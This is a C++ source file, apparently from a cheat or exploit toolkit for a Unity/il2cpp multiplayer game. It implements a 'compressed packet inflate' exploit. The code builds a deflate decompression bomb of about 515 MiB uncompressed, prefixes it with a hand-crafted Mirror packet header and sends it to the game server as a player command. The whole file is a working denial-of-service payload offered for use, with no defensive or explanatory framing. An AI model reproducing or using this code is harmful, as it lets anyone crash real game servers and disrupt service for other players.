#include "compressedpacketinflateexploit.h"
#include "../il2cpp.h"
#include "../gamesdk.h"

void CompressedPacketInflateExploit::Invoke()
{
	// the mirror only permits up to 0x80000. leave a few bytes for other stuff.
	// has an expansion factor of ~1032, so this is ~515 MiB of uncompressed data.
	size_t inflateBombArraySize = 0x7ff80;
	// size_t inflateBombArraySize = 0x7ffffff;
	il2cpp::Il2CppArray* inflateBombArray = il2cpp::il2cpp_array_new(Game::System::Byte::klass, inflateBombArraySize);
	// prefix, body, and suffix were experimentally found on cyberchef with raw deflate dynamic huffman coding
	const char bombPrefix[] = "\xed\xc0\x31\x01\x00\x00\x00\xc2\x20\xfb\xa7\x5e\x0d\x0f\x18";
	const size_t bombPrefixSize = sizeof(bombPrefix) - 1; // minus null
	const char bombSuffix[] = "\xbc\x09";
	const size_t bombSuffixSize = sizeof(bombSuffix) - 1; // minus null
	char* inflateBombArrayRaw = ((char*)inflateBombArray) + sizeof(il2cpp::Il2CppArray);
	// write out prefix
	memcpy(inflateBombArrayRaw, bombPrefix, bombPrefixSize);
	// fill the rest of space with 0x00
	memset(inflateBombArrayRaw + bombPrefixSize, 0x00, inflateBombArraySize - bombPrefixSize);
	// write out suffix at the end
	memcpy((inflateBombArrayRaw + inflateBombArraySize) - bombSuffixSize, bombSuffix, bombSuffixSize);

	auto localplayer = Game::PlayerInstance::get_LocalInstance();
	auto writer = Game::Mirror::NetworkWriterPool::Get();
	// 10 = 2 extra len bytes | 0 = compressed data | 00 sessionid | 111 = 0x7(ff 80) bytes of data
	Game::Mirror::NetworkWriter::WriteByte(writer, 0b10000111);
	Game::Mirror::NetworkWriter::WriteByte(writer, 0xff);
	Game::Mirror::NetworkWriter::WriteByte(writer, 0x80);
	Game::Mirror::NetworkWriter::WriteBytes(writer, inflateBombArray, 0, *(int32_t *)&inflateBombArray->max_length);
	// localplayer inherits from NetworkBehaviour, so this should be fine
	Game::Mirror::NetworkBehaviour::SendCommandInternal(
		localplayer,
		"System.Void Game.Player.GamePlayerClient::CmdSendPacketToServer(GameClientPacket)"_il2cpp,
		0x5d559231, writer, 1, true
	);

	Game::Mirror::NetworkWriterPool::Return(writer);
}
